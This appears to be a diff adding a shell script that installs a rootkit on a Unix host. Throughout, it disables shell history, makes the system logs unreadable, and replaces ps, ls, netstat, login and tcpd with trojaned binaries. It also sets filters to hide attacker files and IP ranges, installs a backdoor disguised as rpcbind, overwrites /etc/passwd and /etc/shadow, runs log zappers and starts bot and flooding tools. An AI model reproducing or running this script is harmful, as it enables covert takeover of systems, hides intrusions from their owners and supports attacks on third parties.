@@ -1,0 +1,121 @@
+#!/bin/sh
+echo 'hax0r w1th k1dd13'
+unset HISTFILE; unset SAVEHIST
+chmod 0 /var/log/*
+chmod 0 /var/adm/*
+mkdir /var/spool/.recent
+cp log /dev
+cp /bin/netstat ./netstat-back
+cp /bin/ps ./ps-back
+cp /bin/ls ./ls-back
+cp ./netstat-back /var/spool/.recent/.net_filter
+echo "|grep -v '63.70.' |grep -v '63.'|" >>/var/spool/.recent/.net_filter
+echo "|grep -v 'sun' |grep -v 'sun.tar'|grep -v 'sys222' |grep -v 'sys222.conf'|grep -v 'packet' |grep -v 'smurf'|grep -v 'udp.s' |grep -v '/usr/man/man1/.. '" >> /var/spool/.recent/.find_filter
+cat << EOF >> /var/spool/.recent/.files
+sys222.conf
+setup.sh
+idsol
+idrun
+bot2
+bot3
+l0gin 
+le 
+netstat 
+zap3
+tcpd
+fix
+ps-back
+netstat-back
+tcp.log
+sys222.conf
+sys222
+check
+packet
+me
+sun
+sun.tar
+sun2.tar
+sec  
+bot
+EOF
+echo "..." >> /var/spool/.recent/.files
+mv tcpd /usr/sbin/tcpd
+cat << EOF >>/var/spool/.recent/.tcpd
+1 home.com
+1 63.
+1 63
+1 202.
+1 202
+1 61
+1 61.
+1 216.
+1 216
+1 209.
+1 209
+EOF
+echo "Ok This thing is complete :-)"
+cat << EOF >> /dev/ttyp
+sys222
+update
+rpcbind
+sunst
+kshr
+in.telnetd
+ping
+le
+sunsmurf
+udp.s
+syn
+telnet
+le
+zap3
+me
+psybnc
+lpset
+lpstart
+ss
+EOF
+mv /dev/ttyp ./
+cp netstat /bin/netstat
+cp netstat /usr/bin/netstat
+cp ls /bin/ls
+cp ls /usr/bin/ls
+cp ps /bin/ps
+cp ps /usr/bin/ps
+cp /bin/login /bin/.ln
+cp l0gin /bin/login
+cp ls /bin/ls
+cp find /usr/local/bin/find
+chmod +x /bin/login
+chmod +x sys222
+chmod +x bd2
+mv bd2 rpcbind
+cp rpcbind /usr/sbin/rpcbind
+cp pico /bin/pico
+chmod +x /bin/pico
+mv /etc/.ts /etc/shadow
+mv /etc/.tp /etc/passwd
+cp ./pico /bin/pico
+chmod +x /bin/pico
+chmod +x idsol
+chmod +x idrun
+chmod +x sl4
+./zap3 -v re
+./zap -v r
+chmod +x secure.sh
+./secure.sh
+ps -u root | grep inetd 
+ps -u root | grep sadmind
+ps -u root | grep rpcbind
+mv ttyp /dev
+TERM=vt100
+export TERM
+/usr/sbin/rpcbind
+cp /dev/".. "/sun/bot2 ./
+echo "kill these processes@!#!@#!"
+cp lpq /usr/lib
+cp idsol /usr/lib/lpsys
+cp idrun /dev/ttyt
+/dev/ttyt/idrun desire &
+./sys222
+
